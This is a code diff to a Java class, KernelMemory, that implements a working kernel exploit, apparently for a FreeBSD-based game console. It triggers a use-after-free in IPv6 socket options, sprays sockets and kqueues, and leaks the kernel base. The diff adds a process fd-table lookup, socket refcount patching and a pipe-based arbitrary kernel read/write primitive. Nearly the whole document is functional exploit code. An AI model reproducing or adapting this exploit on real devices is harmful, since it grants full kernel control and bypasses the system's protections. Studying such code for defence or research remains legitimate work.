@@ -44,12 +44,17 @@ public class KernelMemory {
 
     private static long kevent_addr = 0;
     private static long pktopts_addr = 0;
+    private static long proc_fd_addr = 0;
+    private static long pipe_addr = 0;
     private static long kernel_base = 0;
 
     static int kevent_sock = -1;
     static int master_sock = -1;
     static int overlap_sock = -1;
     static int victim_sock = -1;
+
+    static int pipe_read = -1;
+    static int pipe_write = -1;
     
     static int[] spray_sock = new int[NUM_SPRAY];
     static int[] kq = new int[NUM_KQUEUES];
@@ -57,9 +62,17 @@ public class KernelMemory {
     private static void println(String s) {
 	LoggingUI.getInstance().log(s);
     }
+
+    private static void perror(String s) {
+	println(s + ": " + libcInternal.strerror());
+    }
     
     private static int new_socket() {
-	return libkernel.socket(AF_INET6, SOCK_DGRAM, IPPROTO_UDP);
+	int ret = libkernel.socket(AF_INET6, SOCK_DGRAM, IPPROTO_UDP);
+	if(ret < 0) {
+	    perror("socket");
+	}
+	return ret;
     }
 
     private static void build_tclass_cmsg(long buf, int val) {
@@ -86,14 +99,24 @@ public class KernelMemory {
 
     private static int get_rthdr(int s, long buf, int len) {
 	long addr = NativeMemory.allocateMemory(4);
-	NativeMemory.putInt(addr, len);
-	int ret = libkernel.getsockopt(s, IPPROTO_IPV6, IPV6_RTHDR, buf, addr);
-	NativeMemory.freeMemory(addr);
-	return ret;
+	try {
+	    NativeMemory.putInt(addr, len);
+	    int ret = libkernel.getsockopt(s, IPPROTO_IPV6, IPV6_RTHDR, buf, addr);
+	    if(ret < 0) {
+		perror("getsockopt");
+	    }
+	    return ret;
+	} finally {
+	    NativeMemory.freeMemory(addr);
+	}
     }
 
     private static int set_rthdr(int s, long buf, int len) {
-	return libkernel.setsockopt(s, IPPROTO_IPV6, IPV6_RTHDR, buf, len);
+	int ret = libkernel.setsockopt(s, IPPROTO_IPV6, IPV6_RTHDR, buf, len);
+	if(ret < 0) {
+	    perror("setsockopt");
+	}
+	return ret;
     }
 
     private static int free_rthdr(int s) {
@@ -106,53 +129,72 @@ public class KernelMemory {
 	long p_val = NativeMemory.allocateMemory(4);
 	long p_len = NativeMemory.allocateMemory(4);
 
-	NativeMemory.putInt(p_len, 4);
-	NativeMemory.putInt(p_val, 0);
-	libkernel.getsockopt(s, IPPROTO_IPV6, IPV6_TCLASS, p_val, p_len);
-	val = NativeMemory.getInt(p_val);
-
-	NativeMemory.freeMemory(p_val);
-	NativeMemory.freeMemory(p_len);
-
-	return val;
+	try {
+	    NativeMemory.putInt(p_len, 4);
+	    NativeMemory.putInt(p_val, 0);
+	    if(libkernel.getsockopt(s, IPPROTO_IPV6, IPV6_TCLASS, p_val, p_len) == 0) {
+		return NativeMemory.getInt(p_val);
+	    } else {
+		perror("getsockopt");
+		return 0;
+	    }
+	} finally {
+	    NativeMemory.freeMemory(p_val);
+	    NativeMemory.freeMemory(p_len);
+	}
     }
 
-    private static int set_tclass(int s, int val) {
+    private static void set_tclass(int s, int val) {
 	long p_val = NativeMemory.allocateMemory(4);
-	NativeMemory.putInt(p_val, val);
-	int ret = libkernel.setsockopt(s, IPPROTO_IPV6, IPV6_TCLASS, p_val, 4);
-	NativeMemory.freeMemory(p_val);
-	return ret;
+	try {
+	    NativeMemory.putInt(p_val, val);
+	    if(libkernel.setsockopt(s, IPPROTO_IPV6, IPV6_TCLASS, p_val, 4) != 0) {
+		perror("setsockopt");
+	    }
+	} finally {
+	    NativeMemory.freeMemory(p_val);
+	}
     }
 
-    private static int get_pktinfo(int s, long buf) {
+    private static void get_pktinfo(int s, long buf) {
 	long p_len = NativeMemory.allocateMemory(4);
-	NativeMemory.putInt(p_len, IN6_PKTINFO_SIZE);
-	int ret = libkernel.getsockopt(s, IPPROTO_IPV6, IPV6_PKTINFO, buf, p_len);
-	NativeMemory.freeMemory(p_len);
-	return ret;
+	try {
+	    NativeMemory.putInt(p_len, IN6_PKTINFO_SIZE);
+	    if(libkernel.getsockopt(s, IPPROTO_IPV6, IPV6_PKTINFO, buf, p_len) != 0) {
+		perror("getsockopt");
+	    }
+	} finally {
+	    NativeMemory.freeMemory(p_len);
+	}
     }
 
-    private static int set_pktinfo(int s, long buf) {
-	return libkernel.setsockopt(s, IPPROTO_IPV6, IPV6_PKTINFO, buf, IN6_PKTINFO_SIZE);
+    private static void set_pktinfo(int s, long buf) {
+	if(libkernel.setsockopt(s, IPPROTO_IPV6, IPV6_PKTINFO, buf, IN6_PKTINFO_SIZE) != 0) {
+	    perror("setsockopt");
+	}
     }
 
-    private static int set_pktopts(int s, long buf, int len) {
-	return libkernel.setsockopt(s, IPPROTO_IPV6, IPV6_2292PKTOPTIONS, buf, len);
+    private static void set_pktopts(int s, long buf, int len) {
+	if(libkernel.setsockopt(s, IPPROTO_IPV6, IPV6_2292PKTOPTIONS, buf, len) != 0) {
+	    perror("setsockopt");
+	}
     }
 
-    private static int free_pktopts(int s) {
-	return set_pktopts(s, 0, 0);
+    private static void free_pktopts(int s) {
+	set_pktopts(s, 0, 0);
     }
 
     private static long leak_rthdr_ptr(int s) {
 	long buf = NativeMemory.allocateMemory(0x100);
-	NativeMemory.setMemory(buf, 0x100, (byte)0);
-	get_rthdr(s, buf, 0x100);
-	long ret = NativeMemory.getLong(buf + PKTOPTS_RTHDR_OFFSET);
-	NativeMemory.freeMemory(buf);
-	return ret;
-}
+	try {
+	    NativeMemory.setMemory(buf, 0x100, (byte)0);
+	    get_rthdr(s, buf, 0x100);
+	    return NativeMemory.getLong(buf + PKTOPTS_RTHDR_OFFSET);
+	} finally {
+	    NativeMemory.freeMemory(buf);
+	}
+    }
+    
     private static long leak_kmalloc(long buf, int size) {
 	int rthdr_len = build_rthdr_msg(buf, size);
 	set_rthdr(master_sock, buf, rthdr_len);
@@ -161,82 +203,80 @@ public class KernelMemory {
 
     private static void write_to_victim(long addr) {
 	long buf = NativeMemory.allocateMemory(IN6_PKTINFO_SIZE);
-	NativeMemory.setMemory(buf, IN6_PKTINFO_SIZE, (byte)0);
-	NativeMemory.putLong(buf + 0x00, addr);
-	NativeMemory.putLong(buf + 0x08, 0);
-	NativeMemory.putLong(buf + 0x10, 0);
-	set_pktinfo(master_sock, buf);
-	NativeMemory.freeMemory(buf);
+	try {
+	    NativeMemory.setMemory(buf, IN6_PKTINFO_SIZE, (byte)0);
+	    NativeMemory.putLong(buf + 0x00, addr);
+	    NativeMemory.putLong(buf + 0x08, 0);
+	    NativeMemory.putInt(buf + 0x10, 0);
+	    set_pktinfo(master_sock, buf);
+	} finally {
+	    NativeMemory.freeMemory(buf);
+	}
     }
 
     private static int find_victim_sock() {
 	long buf = NativeMemory.allocateMemory(IN6_PKTINFO_SIZE);
-	int ret = -1;
-
-	NativeMemory.setMemory(buf, IN6_PKTINFO_SIZE, (byte)0);
-	write_to_victim(pktopts_addr + PKTOPTS_PKTINFO_OFFSET);
-	for(int i=0; i<NUM_SPRAY; i++) {
-	    get_pktinfo(spray_sock[i], buf);
-	    if(NativeMemory.getLong(buf + 0x00) != 0) {
-		ret = i;
-		break;
+	try {
+	    NativeMemory.setMemory(buf, IN6_PKTINFO_SIZE, (byte)0);
+	    write_to_victim(pktopts_addr + PKTOPTS_PKTINFO_OFFSET);
+	    for(int i=0; i<NUM_SPRAY; i++) {
+		get_pktinfo(spray_sock[i], buf);
+		if(NativeMemory.getLong(buf + 0x00) != 0) {
+		    return i;
+		}
 	    }
+	    return -1;
+	} finally {
+	    NativeMemory.freeMemory(buf);
 	}
-
-	NativeMemory.freeMemory(buf);
-	return ret;
     }
 
     private static byte kread8(long addr) {
 	long buf = NativeMemory.allocateMemory(IN6_PKTINFO_SIZE);
-	byte ret;
-
-	NativeMemory.setMemory(buf, IN6_PKTINFO_SIZE, (byte)0);
-	write_to_victim(addr);
-	get_pktinfo(victim_sock, buf);
-	ret = NativeMemory.getByte(buf);
-	NativeMemory.freeMemory(buf);
-
-	return ret;
+	try {
+	    NativeMemory.setMemory(buf, IN6_PKTINFO_SIZE, (byte)0);
+	    write_to_victim(addr);
+	    get_pktinfo(victim_sock, buf);
+	    return NativeMemory.getByte(buf);
+	} finally {
+	    NativeMemory.freeMemory(buf);
+	}
     }
     
     private static short kread16(long addr) {
 	long buf = NativeMemory.allocateMemory(IN6_PKTINFO_SIZE);
-	short ret;
-
-	NativeMemory.setMemory(buf, IN6_PKTINFO_SIZE, (byte)0);
-	write_to_victim(addr);
-	get_pktinfo(victim_sock, buf);
-	ret = NativeMemory.getShort(buf);
-	NativeMemory.freeMemory(buf);
-
-	return ret;
+	try {
+	    NativeMemory.setMemory(buf, IN6_PKTINFO_SIZE, (byte)0);
+	    write_to_victim(addr);
+	    get_pktinfo(victim_sock, buf);
+	    return NativeMemory.getShort(buf);
+	} finally {
+	    NativeMemory.freeMemory(buf);
+	}
     }
 
     private static int kread32(long addr) {
 	long buf = NativeMemory.allocateMemory(IN6_PKTINFO_SIZE);
-	int ret;
-
-	NativeMemory.setMemory(buf, IN6_PKTINFO_SIZE, (byte)0);
-	write_to_victim(addr);
-	get_pktinfo(victim_sock, buf);
-	ret = NativeMemory.getInt(buf);
-	NativeMemory.freeMemory(buf);
-
-	return ret;
+	try {
+	    NativeMemory.setMemory(buf, IN6_PKTINFO_SIZE, (byte)0);
+	    write_to_victim(addr);
+	    get_pktinfo(victim_sock, buf);
+	    return NativeMemory.getInt(buf);
+	} finally {
+	    NativeMemory.freeMemory(buf);
+	}
     }
 
     private static long kread64(long addr) {
 	long buf = NativeMemory.allocateMemory(IN6_PKTINFO_SIZE);
-	long ret;
-
-	NativeMemory.setMemory(buf, IN6_PKTINFO_SIZE, (byte)0);
-	write_to_victim(addr);
-	get_pktinfo(victim_sock, buf);
-	ret = NativeMemory.getLong(buf);
-	NativeMemory.freeMemory(buf);
-
-	return ret;
+	try {
+	    NativeMemory.setMemory(buf, IN6_PKTINFO_SIZE, (byte)0);
+	    write_to_victim(addr);
+	    get_pktinfo(victim_sock, buf);
+	    return NativeMemory.getLong(buf);
+	} finally {
+	    NativeMemory.freeMemory(buf);
+	}
     }
 
     private static int find_overlap_sock() {
@@ -330,7 +370,7 @@ public class KernelMemory {
 	return find_overlap_sock();
     }
 
-    private static int fake_pktopts(int target_fd, long pktinfo, int tag) {
+    private static int fake_pktopts(int target_fd, long pktinfo, int tag) throws IOException {
 	long buf = NativeMemory.allocateMemory(0x100);
 	int rthdr_len, tclass;
 
@@ -350,9 +390,7 @@ public class KernelMemory {
 
 	// See if pktopts has been refilled correctly
 	if((tclass & 0xffff0000) != tag) {
-	    println("[-] Error could not refill pktopts.");
-	    libkernel.usleep(1000*5000);
-	    System.exit(1);
+	    throw new IOException("Cannot refill pktopts");
 	}
 
 	return tclass & 0xffff;
@@ -384,7 +422,9 @@ public class KernelMemory {
 	// Free rthdr buffer and spray kevents to occupy this location
 	free_rthdr(master_sock);
 	for (int i=0; i<NUM_KQUEUES; i++) {
-	    libkernel.kevent(kq[i], kv, 1, 0, 0, 0);
+	    if(libkernel.kevent(kq[i], kv, 1, 0, 0, 0) < 0) {
+		perror("kevent");
+	    }
 	}
 
 	// Leak 0x100 kmalloc addr
@@ -413,6 +453,9 @@ public class KernelMemory {
 		for (int i = 0; i < 10000; i++) {
 		    if (i == 5000) {
 			fd = libkernel.kqueue();
+			if(fd < 0) {
+			    perror("kqueue");
+			}
 			fds.add(new Integer(fd));
 		    }
 		    Long addr = new Long(leak_kmalloc(buf, 0x120));
@@ -439,21 +482,94 @@ public class KernelMemory {
 		NativeMemory.freeMemory(buf);
 	    }
 	    for (int fd : fds) {
-		libkernel.close(fd);
+		if(libkernel.close(fd) < 0) {
+		    perror("close");
+		}
 	    }
 	}
     }
 
+    private static long find_proc_fd(int pid) {
+	final int PROC_FD_OFFSET = 72;
+	final int PROC_PID_OFFSET = 188;
+	final int PROC_LIST_OFFSET = 0;
+	
+	if(kernel_base == 0 || KernelOffset.ALLPROC == 0) {
+	    return 0;
+	}
+
+	long proc = kread64(kernel_base + KernelOffset.ALLPROC);
+	while (proc != 0) {
+	    if (kread32(proc + PROC_PID_OFFSET) == pid) {
+		return kread64(proc + PROC_FD_OFFSET);
+	    }
+	    proc = kread64(proc + PROC_LIST_OFFSET);
+	}
+
+	return 0;
+    }
+
+    private static long get_file_addr(int fd) {
+	if(proc_fd_addr == 0) {
+	    return 0;
+	}
+
+	long ofiles_addr = kread64(proc_fd_addr) + 8;
+	long filedescent_addr = kread64(ofiles_addr + (0x30 * fd));
+	return kread64(filedescent_addr); // fde_file
+    }
+    
+    private static void setup_rw_pipe() {
+	if(proc_fd_addr == 0) {
+	    return;
+	}
+
+	long buf = NativeMemory.allocateMemory(8);
+	if(libkernel.pipe(buf) == 0) {
+	    pipe_read = NativeMemory.getInt(buf);
+	    pipe_write = NativeMemory.getInt(buf + 4);
+	    pipe_addr = get_file_addr(pipe_read);
+	} else {
+	    perror("pipe");
+	}
+	NativeMemory.freeMemory(buf);
+    }
+    
+    private static void inc_socket_refcount(int fd) {
+	long file_addr = get_file_addr(fd);
+	if(file_addr == 0) {
+	    return;
+	}
+	
+	long buf = NativeMemory.allocateMemory(IN6_PKTINFO_SIZE);
+	NativeMemory.setMemory(buf, IN6_PKTINFO_SIZE, (byte)0);
+	NativeMemory.putInt(buf, 0x100);
+	NativeMemory.putInt(buf + 4, 2);
+
+	write_to_victim(file_addr);
+	set_pktinfo(victim_sock, buf);
+	
+	NativeMemory.freeMemory(buf);
+    }
+    
     private static void cleanup() {
+	inc_socket_refcount(overlap_sock);
+	inc_socket_refcount(master_sock);
+	inc_socket_refcount(victim_sock);
+	
 	for (int sock : spray_sock) {
-	    libkernel.close(sock);
+	    if(libkernel.close(sock) < 0) {
+		perror("close");
+	    }
 	}
 	for (int fd : kq) {
-	    libkernel.close(fd);
+	    if(libkernel.close(fd) < 0) {
+		perror("close");
+	    }
 	}
     }
     
-    public static void enableRW() {
+    public static void enableRW() throws IOException {
 	long knote, kn_fop, f_detach;
 	int idx;
 
@@ -468,14 +584,15 @@ public class KernelMemory {
 
 	for(int i=0; i<NUM_KQUEUES; i++) {
 	    kq[i] = libkernel.kqueue();
+	    if(kq[i] < 0) {
+		perror("kqueue");
+	    }
 	}
 
 	println("[*] Triggering UAF...");
 	idx = trigger_uaf();
 	if(idx == -1) {
-	    println("[-] Error could not find overlap sock.");
-	    libkernel.usleep(1000*5000);
-	    System.exit(1);
+	    throw new IOException("Cannot find overlapping socket");
 	}
 
 	// master_sock and overlap_sock point to the same pktopts
@@ -505,9 +622,7 @@ public class KernelMemory {
 
 	idx = find_victim_sock();
 	if (idx == -1) {
-	    println("[-] Error could not find victim sock.");
-	    libkernel.usleep(1000*5000);
-	    System.exit(1);
+	    throw new IOException("Cannot find victim socket");
 	}
 
 	victim_sock = spray_sock[idx];
@@ -519,9 +634,24 @@ public class KernelMemory {
 	long kqueue_addr = leak_kqueue();
 	kernel_base = (kqueue_addr & ~0xFFFF) - 0x310000;
 	println("[+] Kernel base: 0x" + Long.toHexString(kernel_base));
+
+	println("[*] Finding process fd");
+	proc_fd_addr = find_proc_fd(libkernel.getpid());
+	if(proc_fd_addr == 0) {
+	    cleanup();
+	    throw new IOException("Cannot find proc fd");
+	}
+	println("[+] proc_fd_addr: 0x" + Long.toHexString(proc_fd_addr));
 	
 	println("[*] Cleaning up...");
 	cleanup();
+
+	println("[*] Setting up kernel read/write pipe...");
+	setup_rw_pipe();
+	if(pipe_addr == 0) {
+	    throw new IOException("Cannot setup R/W pipe");
+	}
+	println("[+] pipe_addr: 0x" + Long.toHexString(pipe_addr));
     }
 
     public static long getBaseAddress() {
@@ -561,6 +691,107 @@ public class KernelMemory {
 	}
 	synchronized(KernelMemory.class) {
 	    return kread64(addr);
+	}
+    }
+
+    public static long copyout(long dst_addr, long src_addr, int length) throws IOException {
+	if(pipe_addr == 0) {
+	    throw new IOException("Invalid pipe");
+	}
+
+	synchronized(KernelMemory.class) {
+	    long buf = NativeMemory.allocateMemory(IN6_PKTINFO_SIZE);
+
+	    try {
+		NativeMemory.setMemory(buf, IN6_PKTINFO_SIZE, (byte)0);
+		NativeMemory.putLong(buf, 0x4000000040000000l);
+		NativeMemory.putLong(buf + 8, 0x4000000000000000l);
+
+		write_to_victim(pipe_addr);
+		set_pktinfo(victim_sock, buf);
+
+		NativeMemory.setMemory(buf, IN6_PKTINFO_SIZE, (byte)0);
+		NativeMemory.putLong(buf, src_addr);
+	    
+		write_to_victim(pipe_addr + 16);
+		set_pktinfo(victim_sock, buf);
+
+		return libkernel.read(pipe_read, dst_addr, length);
+	    } finally {
+		NativeMemory.freeMemory(buf);
+	    }
+	}
+    }
+
+    public static long copyin(long dst_addr, long src_addr, int length) throws IOException {
+	if(pipe_addr == 0) {
+	    throw new IOException("Invalid pipe");
+	}
+
+	synchronized(KernelMemory.class) {
+	    long buf = NativeMemory.allocateMemory(IN6_PKTINFO_SIZE);
+
+	    try {
+		NativeMemory.setMemory(buf, IN6_PKTINFO_SIZE, (byte)0);
+		NativeMemory.putLong(buf + 8, 0x4000000000000000l);
+	
+		write_to_victim(pipe_addr);
+		set_pktinfo(victim_sock, buf);
+
+		NativeMemory.setMemory(buf, IN6_PKTINFO_SIZE, (byte)0);
+		NativeMemory.putLong(buf, dst_addr);
+
+		write_to_victim(pipe_addr + 0x10);
+		set_pktinfo(victim_sock, buf);
+		
+		return libkernel.write(pipe_write, src_addr, length);
+	    } finally {
+		NativeMemory.freeMemory(buf);
+	    }
+	}
+    }
+
+    public static void putByte(long addr, byte value) throws IOException {
+	long buf = NativeMemory.allocateMemory(1);
+	NativeMemory.putByte(buf, value);
+	
+	try {
+	    copyin(addr, buf, 1);
+	} finally {
+	    NativeMemory.freeMemory(buf);
+	}
+    }
+
+    public static void putShort(long addr, short value) throws IOException {
+	long buf = NativeMemory.allocateMemory(2);
+	NativeMemory.putShort(buf, value);
+	
+	try {
+	    copyin(addr, buf, 2);
+	} finally {
+	    NativeMemory.freeMemory(buf);
+	}
+    }
+    
+    public static void putInt(long addr, int value) throws IOException {
+	long buf = NativeMemory.allocateMemory(4);
+	NativeMemory.putInt(buf, value);
+	
+	try {
+	    copyin(addr, buf, 4);
+	} finally {
+	    NativeMemory.freeMemory(buf);
+	}
+    }
+    
+    public static void putLong(long addr, long value) throws IOException {
+	long buf = NativeMemory.allocateMemory(8);
+	NativeMemory.putLong(buf, value);
+	
+	try {
+	    copyin(addr, buf, 8);
+	} finally {
+	    NativeMemory.freeMemory(buf);
 	}
     }
 }
